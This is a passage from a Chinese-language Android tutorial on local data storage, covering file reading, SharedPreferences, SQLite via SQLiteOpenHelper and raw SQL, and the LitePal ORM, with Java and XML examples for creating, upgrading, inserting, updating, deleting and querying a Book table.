&quot;Restoring succeeded&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125; ... public String load() &#123; FileInputStream in = null; BufferedReader reader = null; StringBuilder content = new StringBuilder(); try &#123; in = openFileInput(&quot;data&quot;); reader = new BufferedReader(new InputStreamReader(in)); String line = &quot;&quot;; while ((line = reader.readLine()) != null) &#123; content.append(line); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; if (reader != null) &#123; try &#123; reader.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; return content.toString(); &#125;&#125; loadData() 方法主要是文件流读取的基本操作，然后重写了 onCreate() 方法，这样就可以保证在活动创建时一定会调用 loadData() 方法。在 onCreate() 方法中调用了 TextUtils.isEmpty() 方法来对读取到的字符串进行非空判断。TextUtils.isEmpty() 方法可以一次性进行两种空值的判断。当传入的字符串等于 null 或者等于空字符串的时候，这个方法都会返回 true，从而使得我们不需要先单独判断这两种空值再使用逻辑运算符连接起来了。 SharedPreferences 存储不同于文件的存储方式，SharedPreferences 是使用键值对的方式来存储数据的。也就是说，当保存一条数据的时候，需要给这条数据提供一个对应的键，这样在读取数据的时候就可以通过这个键把相应的值取出来。而且 SharedPreferences 还支持多种不同的数据类型存储。 将数据存储到 SharedPreferences 中要想使用 SharedPreferences 来存储数据，首先需要获取到 SharedPreferences 对象。Android 中主要提供了 3 种方法用于得到 SharedPreferences 对象。 Context 类中的 getSharedPreferences() 方法 此方法接收两个参数： 第一个参数用于指定 SharedPreferences 文件的名称，如果指定的文件不存在则会创建一个，SharedPreferences 文件都是存放在 /data/data/&lt;package name&gt;/shared prefs/ 目录下的。 第二个参数用于指定操作模式，目前只有 MODE PRIVATE 这一种模式可选，它是默认的操作模式，和直接传入 0 效果是相同的，表示只有当前的应用程序才可以对这个 SharedPreferences 文件进行读写。其他几种操作模式均已被废弃。 Activity 类中的 getPreferences() 方法 这个方法和 Context 中的 getSharedPreferences() 方法很相似，不过它只接收一个操作模式参数，因为使用这个方法时会自动将当前活动的类名作为 SharedPreferences 的文件名。 PreferenceManager 类中的 getDefaultSharedPreferences() 方法 这是一个静态方法，它接收一个 Context 参数，并自动使用当前应用程序的包名作为前缀来命名 SharedPreferences 文件。 得到了 SharedPreferences 对象之后，就可以开始向 SharedPreferences 文件中存储数据了，主要可以分为 3 步实现。 调用 SharedPreferences 对象的 edit() 方法来获取一个 SharedPreferences.Editor 对象。 使用 putXXX() 方法向 SharedPreferences.Editor 对象中添加数据，比如添加字符串使用 putString() 方法。 调用 apply() 方法将添加的数据提交，从而完成数据存储操作。 案例 新建一个 SharedPreferencesTest 项目，然后修改 activity_main.xml 中的代码，如下所示： 12345678910111213&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:orientation=&quot;vertical&quot; &gt; &lt;Button android:id=&quot;@+id/save_data&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Save data&quot; /&gt;&lt;/LinearLayout&gt; MainActivity 中的代码 12345678910111213141516171819public class MainActivity extends AppCompatActivity &#123; private String FileName = &quot;account&quot;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; //按钮的点击事件 public void ClicktosaveData(View view) &#123; SharedPreferences sharedPreferences = getSharedPreferences(FileName, Context.MODE_PRIVATE); SharedPreferences.Editor edit = sharedPreferences.edit(); edit.putString(&quot;name&quot;,&quot;Tom&quot;); edit.putInt(&quot;age&quot;,28); edit.putBoolean(&quot;married&quot;,true); edit.apply(); &#125;&#125; 首先给按钮注册了一个点击事件，然后在点击事件中通过 getSharedPreferences() 方法指定 SharedPreferences 的文件名为 data，并得到了 SharedPreferences.Editor 对象。接着向这个对象中添加了 3 条不同类型的数据，最后调用 apply() 方法进行提交，从而完成了数据存储的操作。 从 SharedPreferences 中读取数据SharedPreferences 对象中提供了一系列的 get 方法，用于对存储的数据进行读取，每种 get 方法都对应了 SharedPreferences.Editor 中的一种 put 方法，比如读取一个布尔型数据就使用 getBoolean() 方法，读取一个字符串就使用 getString() 方法。这些 get 方法都接收两个参数，第一个参数是键，传入存储数据时使用的键就可以得到相应的值了；第二个参数是默认值，即表示当传入的键找不到对应的值时会以什么样的默认值进行返回。 与存储数据不同，读取数据不需要获取 SharedPreferences.Editor 对象，只需要 SharedPreferences 对象即可，步骤如下： 获取 SharedPreferences 对象 通过 get 方法获取存储的数据 activity_main.xml 中加还原数据按钮的代码 123456&lt;Button android:id=&quot;@+id/restore_data&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Restore data&quot; /&gt; MainActivity 的代码： 1234567891011121314151617181920212223public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ... Button restoreData = (Button) findViewById(R.id.restore_data); restoreData.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SharedPreferences pref = getSharedPreferences(&quot;data&quot;, MODE_PRIVATE); String name = pref.getString(&quot;name&quot;, &quot;&quot;); int age = pref.getInt(&quot;age&quot;, 0); boolean married = pref.getBoolean(&quot;married&quot;, false); Log.d(&quot;MainActivity&quot;, &quot;name is &quot; + name); Log.d(&quot;MainActivity&quot;, &quot;age is &quot; + age); Log.d(&quot;MainActivity&quot;, &quot;married is &quot; + married); &#125; &#125;); &#125;&#125; SQLite 数据库存储论谁的数据存储的功能强大，那我只能说还得是数据库更厉害，前两者与之比较简直是相形见绌！Android 系统内置了 SQLite 数据库，它是一款轻量级的关系型数据库，运算速度非常快，占用资源很少，通常只需要几百 KB 的内存就足够了，因而特别适合在移动设备上使用。 创建数据库Android 提供了 SQLiteOpenHelper 帮助类，它让我们能够更加方便地管理数据库，借助这个类就可以非常简单地对数据库进行创建和升级。 我们需要创建一个类来继承 SQLiteOpenHelper 帮助类，它有两个抽象方法，分别是 onCreate() 和 onUpgrade()，我们必须在自己的类里面重写这两个方法，然后分别在这两个方法中去实现创建、升级数据库的逻辑。 SQLiteOpenHelper 中还有两个非常重要的实例方法：getReadableDatabase() 和 getWritableDatabase()。这两个方法都可以创建或打开一个现有的数据库（如果数据库已存在则直接打开，否则创建一个新的数据库)，并返回一个可对数据库进行读写操作的对象。不同的是，当数据库不可写人的时候（如磁盘空间已满），getReadableDatabase() 方法返回的对象将以只读的方式去打开数据库，而 getWritableDatabase() 方法则将出现异常。 SQLiteOpenHelper 中有两个构造方法可供重写，一般使用参数少一点的那个构造方法即可。这个构造方法中接收 4 个参数： 第一个参数是 Context，必须要有它才能对数据库进行操作。 第二个参数是数据库名，创建数据库时使用的就是这里指定的名称。 第三个参数允许我们在查询数据的时候返回一个自定义的 Cursor，一般都是传人 nulL。 第四个参数表示当前数据库的版本号，可用于对数据库进行升级操作。 构建出 SQLiteOpenHelper 的实例之后，再调用它的 getReadableDatabase() 或 getWritableDatabase() 方法就能够创建数据库了，数据库文件会存放在 /data/data/&lt;package name&gt;/databases/ 目录下。此时，重写的 onCreate() 方法也会得到执行，所以通常会在这里去处理一些创建表的逻辑。 新建一个 DatabaseTest 项目。 这里我们希望创建一个名为 BookStore.db 的数据库，然后在这个数据库中新建一张 Book 表，表中有 id（主键）、作者、价格、页数和书名等列。创建数据库表当然还是需要用建表语句的，这里也是要考验一下你的 SQL 基本功了，Book 表的建表语句如下所示： 123456create table Book ( id integer primary key autoincrement, author text, price real, pages integer, name text) SQLite 不像其他的数据库拥有众多繁杂的数据类型，它的数据类型很简单，integer 表示整型，real 表示浮点型，text 表示文本类型，blob 表示二进制类型。另外，上述建表语句中我们还使用了 primary key 将 id 列设为主键，并用 autoincrement 关键字表示 id 列是自增长的。 然后需要在代码中去执行这条 SQL 语句，才能完成创建表的操作。新建 MyDatabaseHelper 类继承自 SQLiteOpenHelper，代码如下所示： 12345678910111213141516171819202122232425262728public class MyDatabaseHelper extends SQLiteOpenHelper &#123; public static final String CREATE_BOOK = &quot;create table Book (&quot; + &quot;id integer primary key autoincrement, &quot; + &quot;author text, &quot; + &quot;price real, &quot; + &quot;pages integer, &quot; + &quot;name text)&quot;; private Context mContext; public MyDatabaseHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version) &#123; super(context, name, factory, version); mContext = context; &#125; @Override public void onCreate(SQLiteDatabase db) &#123; db.execSQL(CREATE_BOOK); Toast.makeText(mContext, &quot;Create succeeded&quot;, Toast.LENGTH_SHORT).show(); &#125; @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) &#123; &#125;&#125; activity_main.xml 中的代码添加按钮组件，最后修改 MainActivity 中的代码 123456789101112131415161718public class MainActivity extends AppCompatActivity &#123; private MyDatabaseHelper dbHelper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dbHelper = new MyDatabaseHelper(this, &quot;BookStore.db&quot;, null, 1); Button createDatabase = (Button) findViewById(R.id.create_database); createDatabase.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; dbHelper.getWritableDatabase(); &#125; &#125;); &#125;&#125; 这里我们在 onCreate() 方法中构建了一个 MyDatabaseHelper 对象，并且通过构造函数的参数将数据库名指定为 BookStore.db，版本号指定为 1，然后在 Create database 按钮的点击事件里调用了 getWritableDatabase() 方法。这样当第一次点击 Create database 按钮时，就会检测到当前程序中并没有 BookStore.db 这个数据库，于是会创建该数据库并调用 MyDatabaseHelper 中的 onCreate() 方法，这样 Book 表也就得到了创建，然后会弹出一个 Toast 提示创建成功。再次点击 Create database 按钮时，会发现此时已经存在 BookStore.db 数据库了，因此不会再创建一次。 尝试使用 Device File Explorer 进行查看，发现只能看到 databases 目录下出现了一个BookStore.db 文件，Book 表是无法通过 File Explorer 看到的。因此我们需要换另一种方式查看，使用 adb shell 来对数据库和表的创建情况进行检查。相关指令如下： 12345678//打开数据库sqlite3 BookStore.db//查看所有表.table//查看建表语句.schema//退出编辑.exit或.quit 升级数据库onUpgrade() 方法是用于对数据库进行升级的，重写 onUpgrade() 方法来实现添加新表 123456789101112public class MyDatabaseHelper extends SQLiteOpenHelper &#123; ... @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) &#123; db.execSQL(&quot;drop table if exists Book&quot;); db.execSQL(&quot;drop table if exists Category&quot;); onCreate(db); &#125;&#125; 在 onUpgrade() 方法中执行了两条 DROP 语句，如果发现数据库中已经存在 Book 表或 Category 表了，就将这两张表删除掉，然后再调用 onCreate() 方法重新创建。这里先将已经存在的表删除掉，因为如果在创建表时发现这张表已经存在了，就会直接报错。 接下来的问题就是如何让 onUpgrade() 方法能够执行了，还记得 SQLiteOpenHelper 的构造方法里接收的第四个参数吗？它表示当前数据库的版本号，之前我们传入的是 1，现在只要传入一个比 1 大的数，就可以让 onUpgrade() 方法得到执行了。修改 MainActivity 中的代码，如下所示： 1234567891011121314public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void ClicktoCreateDataBase(View view) &#123; //版本改为 2 MyDatabaseHelper myDatabaseHelper = new MyDatabaseHelper(this,&quot;BookStore.db&quot;,null,2); myDatabaseHelper.getWritableDatabase(); &#125;&#125; 现在重新运行程序，并点击创建按钮，这时就会再次弹出创建成功的提示。当然，我们也可以通过 adb shell 来验证。 添加数据在数据库中，我们对数据进行的操作无非就是增删改查这四种。相比于在学习数据库时不断编写 insert、delete、update、select 语句，Android 提供了一系列的辅助性方法，使得在 Android 中即使不去编写 SQL 语句，也能轻松完成所有的增删改查操作。 在前面有一点我们没有注意到，就是 SQLiteOpenHelper 的 getReadableDatabase() 和 getwritableDatabase() 方法都会返回一个 SQLiteDatabase 对象，借助这个对象就可以对数据进行增删改查操作了。 那我们先来学习一下如何添加数据。SQLiteDatabase 中提供了一个 insert() 方法，这个方法就是专门用于添加数据的。它接收 3 个参数： 第一个参数是表名。 第二个参数用于在未指定添加数据的情况下给某些可为空的列自动赋值 NULL, 一般我们用不到这个功能，直接传入 null 即可。 第三个参数是一个 ContentValues 对象，它提供了一系列的 put()方法重载，用于向 ContentValues 中添加数据，只需要将表中的每个列名以及相应的待添加数据传入即可。 MainActivity 中的代码如下所示： 12345678910111213141516171819202122232425262728293031323334public class MainActivity extends AppCompatActivity &#123; private MyDatabaseHelper dbHelper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dbHelper = new MyDatabaseHelper(this, &quot;BookStore.db&quot;, null, 2); ... Button addData = (Button) findViewById(R.id.add_data); addData.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); ContentValues values = new ContentValues(); // 开始组装第一条数据 values.put(&quot;name&quot;, &quot;The Da Vinci Code&quot;); values.put(&quot;author&quot;, &quot;Dan Brown&quot;); values.put(&quot;pages&quot;, 454); values.put(&quot;price&quot;, 16.96); db.insert(&quot;Book&quot;, null, values); // 插入第一条数据 values.clear(); // 开始组装第二条数据 values.put(&quot;name&quot;, &quot;The Lost Symbol&quot;); values.put(&quot;author&quot;, &quot;Dan Brown&quot;); values.put(&quot;pages&quot;, 510); values.put(&quot;price&quot;, 19.95); db.insert(&quot;Book&quot;, null, values); // 插入第二条数据 &#125; &#125;); &#125;&#125; 将上面的操作转成 SQL 语句就是： 12insert into Book(name, author, pages, price) values(&quot;The Da Vinci Code&quot;, &quot;Dan Brown&quot;, 454, 16.53);...... 我们先获取到了 SQLiteDatabase 对象，然后使用 ContentValues 来对要添加的数据进行组装。由于 id 被指定为自增长，所以不需要设置 id 的值。然后我们可以打开 BookStore 数据库，执行 select * from Book; 语句（不要忘记最后添加分号）来验证是否添加成功。 更新数据更新数据使用 update() 方法，该方法接收 4 个参数： 第一个参数是表名。 第三个参数是一个 ContentValues 对象，把要更新的数据在这里组装进去。 第三、第四个参数用于约束更新某一行或某几行中的数据，不指定的话默认更新所有行。 MainActivity 中的代码： 1234567891011121314151617181920212223public class MainActivity extends AppCompatActivity &#123; private MyDatabaseHelper dbHelper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dbHelper = new MyDatabaseHelper(this, &quot;BookStore.db&quot;, null, 2); ... Button updateData = (Button) findViewById(R.id.update_data); updateData.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); ContentValues values = new ContentValues(); values.put(&quot;price&quot;, 10.99); db.update(&quot;Book&quot;, values, &quot;name = ?&quot;, new String[] &#123; &quot;The Da Vinci Code&quot; &#125;); &#125; &#125;); &#125;&#125; 从这里可以看出 SQLiteDatabase 的 update() 的第三、第四个参数的具体作用。第三个参数对应的是 SQL 语句的 where 部分，表示更新有 name 等于？的行，而？是一个占位符，可以通过第四个参数提供的一个字符串数组为第三个参数中的每个占位符指定相应的内容 删除数据更新数据使用 delete() 方法，该方法接收 3 个参数： 第一个参数是表名。 第二、三个参数用于约束删除某一行或某几行中的数据，不指定的话默认删除所有行 123456789public class MainActivity extends AppCompatActivity &#123; ...... public void ClicktoCreateupDate(View view) &#123; MyDatabaseHelper myDatabaseHelper = new MyDatabaseHelper(this,&quot;BookStore.db&quot;,null,2); SQLiteDatabase BookDatabase = myDatabaseHelper.getWritableDatabase(); BookDatabase.delete(&quot;Book&quot;,&quot;pages &gt; ?&quot;,new String[]&#123;&quot;500&quot;&#125;); &#125;&#125; 查询数据查询语句使用 query() 方法，因为它的复杂性，所以参数有很多。最短的一个方法也需要传入 7 个参数，分别如下： query()方法参数 对应 SQL 部分 描述 table from table_name 指定查询的表名 columns select column1, column2 指定查询的列名 selection where column = value 指定 where 的约束条件 selectionArgs - 为 where 中的占位符提供具体的值 groupBy group by column 指定需要 group by 的列 having having column = value 对 group by 后的结果进一步约束 orderBy order by column1, column2 指定查询结果的排序方式 MainActivity 中的代码，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839public class MainActivity extends AppCompatActivity &#123; private MyDatabaseHelper dbHelper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); dbHelper = new MyDatabaseHelper(this, &quot;BookStore.db&quot;, null, 2); ... Button queryButton = (Button) findViewById(R.id.query_data); queryButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SQLiteDatabase db = dbHelper.getWritableDatabase(); // 查询 Book 表中所有的数据 Cursor cursor = db.query(&quot;Book&quot;, null, null, null, null, null, null); if (cursor.moveToFirst()) &#123; do &#123; // 遍历 Cursor 对象，取出数据并打印 String name = cursor.getString(cursor.getColumnIndex (&quot;name&quot;)); String author = cursor.getString(cursor.getColumnIndex (&quot;author&quot;)); int pages = cursor.getInt(cursor.getColumnIndex(&quot;pages&quot;)); double price = cursor.getDouble(cursor.getColumnIndex (&quot;price&quot;)); Log.d(&quot;MainActivity&quot;, &quot;book name is &quot; + name); Log.d(&quot;MainActivity&quot;, &quot;book author is &quot; + author); Log.d(&quot;MainActivity&quot;, &quot;book pages is &quot; + pages); Log.d(&quot;MainActivity&quot;, &quot;book price is &quot; + price); &#125; while (cursor.moveToNext()); &#125; cursor.close(); &#125; &#125;); &#125;&#125; moveToFirst() 方法将数据的指针移动到第一行的位置，然后进入了一个循环当中，去遍历查询到的每一行数据。在这个循环中可以通过 Cursor 的 getColumnIndex() 方法获取到某一列在表中对应的位置索引，然后将这个索引传入到相应的取值方法中，就可以得到从数据库中读取到的数据了。 使用 SQL 操作数据库如果我们不习惯使用 Android 提供的方法来对数据进行操作时，我们也可以直接执行 SQL 语句来实现对数据的操作。 添加数据 123db.execSQL(&quot;insert into Book (name,author,pages,price) values(?,?,?,?)&quot;, new String[]&#123;&quot;The Da Vinci Code&quot;,&quot;Dan Brown&quot;,&quot;454&quot;,&quot;16.96&quot;&#125;)SQL 跟新数据 123db.execSQL(&quot;update Book set price = ? where name = ?&quot;, new string[]&#123;&quot;10.99&quot;, &quot;The Da Vinci Code&quot;&#125;);SQL 删除数据 123db.execSQL(&quot;delete from Book where pages &gt; ?&quot;, new String[]&#123;&quot;500&quot;&#125;);SQL 查询数据 1234db.rawQuery(&quot;select * from Book&quot;,null);rawQuery(&quot;select * from Book where author = ?&quot;, new String[]&#123;&quot;Dan Brown&quot;&#125;)SQL 简而言之，第一个参数是通配 SQL 语句，第二个参数是填充通配符的值。 使用 LitePal 操作数据库LitePal 是一款开源的 Android 数据库框架，它采用了对象关系映射（ORM）的模式，并将我们平时开发最常用到的一些数据库功能进行了封装，使得不用编写一行 SQL 语句就可以完成各种建表和増删改查的操作。LitePal 的项目主页上也有详细的使用文档，地址是：https://github.com/LitePalFramework/LitePal 。 配置 LitePal那么怎样才能在项目中使用开源库呢？过去的方式比较复杂，通常需要下载开源库的 Jar 包或者源码，然后再集成到我们的项目当中。而现在就简单得多了，大多数的开源项目都会将版本提交到 jcenter 上，我们只需要在 app/build.gradle 文件中声明该开源库的引用就可以了。 因此，要使用 LitePal 的第一步，就是编辑 app/build.gradle 文件，在 dependencies 闭包中添加如下内容： 123dependencies &#123; implementation &#x27;org.litepal.guolindev:core:3.2.3&#x27;&#125; 添加的这一行声明中，前面部分是固定的，最后的 3.2.3 是版本号的意思，最新的版本号可以到 LitePal 的项目主页上去查看。 在 repositories 块中添加以下代码 12jcenter()maven &#123; url &#x27;https://jitpack.io&#x27; &#125; 再次 build 就把 LitePal 成功引入到当前项目中了，接下来需要配置 litepal.xml 文件。在 app/src/main 目录下创建一个 assets 目录，然后在 assets 目录下再新建一个 litepal.xml 文件（选择 File，命名的时候加文件后缀），接着编辑 litepal.xml 文件中的内容，如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;litepal&gt; &lt;!-- Define the database name of your application. By default each database name should be end with .db. If you didn&#x27;t name your database end with .db, LitePal would plus the suffix automatically for you. For example: &lt;dbname value=&quot;demo&quot; /&gt; --&gt; &lt;dbname value=&quot;BookStore&quot; /&gt; &lt;!-- Define the version of your database. Each time you want to upgrade your database, the version tag would helps. Modify the models you defined in the mapping tag, and just make the version value plus one, the upgrade of database will be processed automatically without concern. For example: &lt;version value=&quot;1&quot; /&gt; --&gt; &lt;version value=&quot;3&quot; /&gt; &lt;!-- Define your models in the list with mapping tag, LitePal will create tables for each mapping class. The supported fields defined in models will be mapped into columns. For example: &lt;list&gt; &lt;mapping class=&quot;com.test.model.Reader&quot; /&gt; &lt;mapping class=&quot;com.test.model.Magazine&quot; /&gt; &lt;/list&gt; --&gt; &lt;list&gt; &lt;/list&gt; &lt;!-- Define where the .db file should be. &quot;internal&quot; means the .db file will be stored in the database folder of internal storage which no one can access. &quot;external&quot; means the .db file will be stored in the path to the directory on the primary external storage device where the application can place persistent files it owns which everyone can access. &quot;internal&quot; will act as default. For example: &lt;storage value=&quot;external&quot; /&gt; --&gt;&lt;/litepal&gt; 其中，&lt;dbname&gt; 标签用于指定数据库名，&lt;version&gt; 标签用于指定数据库版本号，&lt;List&gt; 标签用于指定所有的映射模型，我们稍后就会用到。 最后在 AndroidManifest.xml 文件中添加： 12345678&lt;manifest&gt; &lt;application android:name=&quot;org.litepal.LitePalApplication&quot; ... &gt; ... &lt;/application&gt;&lt;/manifest&gt; 创建和升级数据库刚才在介绍的时候已经说过，LitePal 采取的是对象关系映射（ORM)的模式，那么什么是对象关系映射呢？简单点说，我们使用的编程语言是面向对象语言，而使用的数据库则是关系型数据库，那么将面向对象的语言和面向关系的数据库之间建立一种映射关系，这就是对象关系映射了。 之前为了创建一张 Book 表，需要先分析表中应该包含哪些列，然后再编写出一条建表语句，最后在自定义的 SQLiteOpenHelper 中去执行这条建表语句。但是使用 LitePal 就可以用面向对象的思维来实现同样的功能了，定义一个 Book 类，代码如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public class Book extends LitePalSupport &#123; private int id; private String author; private double price; private int pages; private String name; public Book(int id, String author, double price, int pages, String name) &#123; this.id = id; this.author = author; this.price = price; this.pages = pages; this.name = name; &#125; public Book() &#123; &#125; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getAuthor() &#123; return author; &#125; public void setAuthor(String author) &#123; this.author = author; &#125; public double getPrice() &#123; return price; &#125; public void setPrice(double price) &#123; this.price = price; &#125; public int getPages() &#123; return pages; &#125; public void setPages(int pages) &#123; this.pages = pages; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 这是一个典型的 Java bean，在 Book 类中我们定义了 id、author、price、pages、name 这几个字段，并生成了相应的 getter 和 setter 方法。学过 java web 的应该知道，Book 类对应的是数据库中的 Book 表，而类中的每一个字段分别对应了表中的每一个列，这就是对象关系映射最直观的体验。 接下来我们还需要将 Book 类添加到映射模型列表当中，修改 litepal.xml 中的代码，如下所示： 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;litepal&gt; &lt;dbname value=&quot;BookStore&quot; /&gt; &lt;version value=&quot;1&quot; /&gt; &lt;list&gt; &lt;mapping class=&quot;com.example.testlitepal.Book&quot;/&gt; &lt;/list&gt;&lt;/litepal&gt; 这里使用 &lt;mapping/&gt; 标签来声明我们要配置的映射模型类，注意一定要使用完整的类名。不管有多少模型类需要映射，都使用同样的方式配置在 &lt;list&gt; 标签下即可。到这里我们就已经把所有工作都完成了，现在只要进行任意一次数据库的操作，BookStore.db 数据库应该就会自动创建出来。那么我们修改 MainActivity 中的代码，如下所示： 123456789101112public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void ClicktoCreateDataBase(View view) &#123; LitePal.getDatabase(); &#125;&#125; Connector.getDatabase() 方法是一次最简单的数据库操作，只要点击一下按钮，数据库就会自动创建完成了。运行一下程序，然后点击 Create database 按钮，通过 adb shell 查看，如下图所示： 升级数据库删除之前的数据库可能会造成数据丢失的问题。然而在 LitePal 中，我们并不需要担心这个问题，我们只需要添加或者修改目标内容，然后将版本号 +1 就行了。 比如我们想要向 Book 表中添加一个 press（出版社）列，那么直接在 Book 类中添加一个 press 字段即可并设置好 get 和 set 方法即可（如果有带参的构造函数，记得在参数中添加新属性），代码如下所示： 1234567891011121314public class Book extends LitePalSupport &#123; ...... private String press; ...... public String getPress() &#123; return press; &#125; public void setPress(String press) &#123; this.press = press; &#125;&#125; 与此同时，我们再添加一张 Category 表，那么只需要创建一个 Category 类即可，代码如下所示： 123456789101112131415161718192021222324252627282930public class Category extends LitePalSupport &#123; private int id; private String categoryName; private int categoryCode; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getCategoryName() &#123; return categoryName; &#125; public void setCategoryName(String categoryName) &#123; this.categoryName = categoryName; &#125; public int getCategoryCode() &#123; return categoryCode; &#125; public void setCategoryCode(int categoryCode) &#123; this.categoryCode = categoryCode; &#125;&#125; 改完了所有我们想改的东西，只需要记得将版本号 +1 就行了。当然由于这里还添加了一个新的模型类，因此也需要将它添加到映射模型列表中。修改 litepal.xml 中的代码，如下所示： 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;litepal&gt; &lt;dbname value=&quot;BookStore&quot; /&gt; &lt;version value=&quot;2&quot; /&gt; &lt;list&gt; &lt;mapping class=&quot;com.example.testlitepal.Book&quot;/&gt; &lt;mapping class=&quot;com.example.testlitepal.Category&quot;/&gt; &lt;/list&gt;&lt;/litepal&gt; 添加数据对于增删改操作，模型类必须要继承 LitePalSupport 类才行。 之后我们只需要创建出模型类的实例，再将所有要存储的数据设置好，最后调用一下 save() 方法就可以了。 好在我们写的代码已经继承了，所以代码直接复用就行。因此我们只需要修改 MainActivity 代码，如下所示： 12345678910111213141516public class MainActivity extends AppCompatActivity &#123; ...... public void ClicktoAddData(View view) &#123; //创建实体类 Book book = new Book(); //设置属性值 book.setName(&quot;The Da Vinci Code&quot;); book.setAuthor(&quot;Dan Brown&quot;); book.setPages(454); book.setPrice(16.92); book.setPress(&quot;Unknow&quot;); //向 Book 表中添加数据 book.save(); &#125;&#125; 更新数据更新数据要比添加数据稍微复杂一点，因为它的 API 接口比较多，这里我们只介绍最常用的几种更新方式。 首先，最简单的一种更新方式就是对数据库中 已存储的对象 重新设值，然后重新调用 save() 方法即可。例子如下所示： 12345678public void ClicktoUpData(View view) &#123; //在 Book 表中找到 id 为 1 的记录 Book book = LitePal.find(Book.class,1) //设置要修改的值 book.setPrice(10.99); //提交 book.save();&#125; 其中 LitePal.find(model.class,id) 方法的第一个参数为表对应的类，第二个为要更新的记录的 id。 第二种方法是使用 model.update(id) 或 model.updateAll(conditions) 方法，示例代码如下： 1234567891011public void ClicktoUpData(View view) &#123; Book book = new Book(); book.setPrice(9.99); book.setPress(&quot;Anchor&quot;); //更新 id = 1 的记录 book.update(1); //更新页数为 510 页的记录 book.updateAll(&quot;pages = ?&quot;,&quot;510&quot;);&#125; 其中 update() 方法指定 id 即可，updateAll() 方法可以指定一个或多个约束条件，如果不指定条件语句的话，就表示更新所有数据。 当你想把一个字段的值更新成默认值时，是不可以使用上面的方式来设置数据的。在 Java 中任何一种数据类型的字段都会有默认值，当我们 new 出一个 Book 对象时，其实所有字段都已经被初识化成默认值了，比如 pages 默认为 0，因此，如果我们想把数据库表中的 pages 列更新成 0，直接调用 book.setPages(0) 是不可以的，因为即使不调用这行代码，pages 字段本身也是 0，LitePal 此时是不会对这个列进行更新的。 对于将数据更新成默认值的操作，LitePal 统一提供了一个 setToDefault() 方法，然后传入相应的列名就可以了实现了。比如我们可以这样写： 123Book book = new Book();book.setToDefault(&quot;pages&quot;);book.updateAll(); 这段代码的意思是，将所有书的页数都更新为 0，因为 updateAll() 方法中没有指定约束条件，因此更新操作对所有数据都生效了。 删除数据删除数据有两种方法：LitePal.delete(model.class,id) 方法和 LitePal.deleteAll(model.class,conditions) 方法。示例如下： 123456public void ClicktoCreateDataBase(View view) &#123; //删除 Book 表中 id = 1 的记录 LitePal.delete(Book.class, 1); //删除 Book 表中 name = &quot;Dan Brown&quot; 的记录 LitePal.deleteAll(Book.class, &quot;name = ?&quot; , &quot;Dan Brown&quot;);&#125; 查询数据对于查询数据，LitePal 提供了 find()、findAll()、select()、where()、order()、limit()、offset() 方法进行组合查询， select()：用于指定查询哪几列的数据，对应了 SQL 当中的 select 关键字。比如只查 name 和 author 这两列的数据，就可以这样写： 1List&lt;Book&gt; books = LitePal.select(&quot;name&quot;,&quot;author&quot;).find(Book.class); where() 方法：用于指定查询的约束条件，对应了 SQL 当中的 where 关键字。比如只查页数大于 400 的数据，就可以这样写： 1List&lt;Book&gt; books = LitePal.where(&quot;pages &gt; ?&quot;,&quot;400&quot;).find(Book.class); order() 方法：用于指定结果的排序方式，对应了 SQL 当中的 order by 关键字。比如将查询结果按照书价从高到低排序，就可以这样写： 1List&lt;Book&gt; books = LitePal.order(&quot;price desc&quot;).find(Book.class); 其中 desc 表示降序排列，asc 或者不写表示升序排列。 limit() 方法：用于指定查询结果的数量，比如只查表中的前 3 条数据，就可以这样写： 1List&lt;Book&gt; books = LitePal.limit(3).find(Book.class); offset() 方法：用于指定查询结果的偏移量，比如查询表中的第 2 条、第 3 条、第 4 条数据，就可以这样写： 1List&lt;Book&gt; books = LitePal.limit(3).offset(1).find(Book.class); 